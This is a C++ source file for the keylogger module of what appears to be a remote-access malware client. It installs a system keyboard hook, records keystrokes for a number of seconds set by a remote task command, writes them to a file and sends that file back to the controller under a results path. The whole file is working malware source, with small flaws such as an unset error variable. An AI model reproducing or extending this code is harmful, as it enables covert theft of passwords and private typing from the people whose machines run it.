#pragma once
#include "keylogger_client.h"
#include <task\client_tasks\keylogger\keyhook.h>

keylogger_client::keylogger_client()
{
	/* path on method = user/results_keylogger/method(capture_keys)*/
	base_path = "user/results_keylogger/";
	path = "user/results";
}

keylogger_client::~keylogger_client()
{

}

bool keylogger_client::capture_keys(std::string _seconds)
{
	seconds = atoi(_seconds.c_str());

	if (install_hook())
		return false;

	while (GetMessageWithTimeout(&msg, seconds))
	{
		if (bRet == -1)
		{
			// handle the error
			break;
		}
		else
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
	uninstall_hook();

	if (keyhook::keylog.size())
		keyhook::insert_data();

	recv_file();

	return true;
}

BOOL keylogger_client::GetMessageWithTimeout(MSG *msg, UINT to)
{
	BOOL res;
	UINT_PTR timerId = SetTimer(NULL, NULL, to, NULL);
	res = GetMessage(msg, NULL, 0, 0);
	KillTimer(NULL, timerId);
	if (!res)
		return FALSE;
	if (msg->message == WM_TIMER && msg->hwnd == NULL && msg->wParam == timerId)
		return FALSE; //TIMEOUT! You could call SetLastError() or something...
	return TRUE;
}

void keylogger_client::recv_file()
{
	file_name = keyhook::file_manager::get()->get_file_name();
}


void keylogger_client::execute()
{
	auto funct = fetch_function(results["method"]);
	results["completed"] = funct();
}


void keylogger_client::on_execute()
{
 	send_results(results["id"], path_on_method, file_name);
}

void keylogger_client::run(
	std::string id,
	bool response,
	std::string method,
	std::vector<std::string> args
) {
	base_task::run(id, response, method, args);
}

bool keylogger_client::uninstall_hook()
{
	return keyhook::UninstallHook();
}

bool keylogger_client::install_hook()
{
	return keyhook::InstallHook();
}

keylogger_client* keylogger_client::get()
{
	static keylogger_client* singleton = nullptr;
	if (!singleton)
		singleton = new keylogger_client();

	return singleton;
}

_function keylogger_client::fetch_function(std::string _function_name)
{
	if (_function_name == "capture_keys")
		return std::bind(
			&keylogger_client::capture_keys,
			this,
			_args[0]
		);


	return _function();
}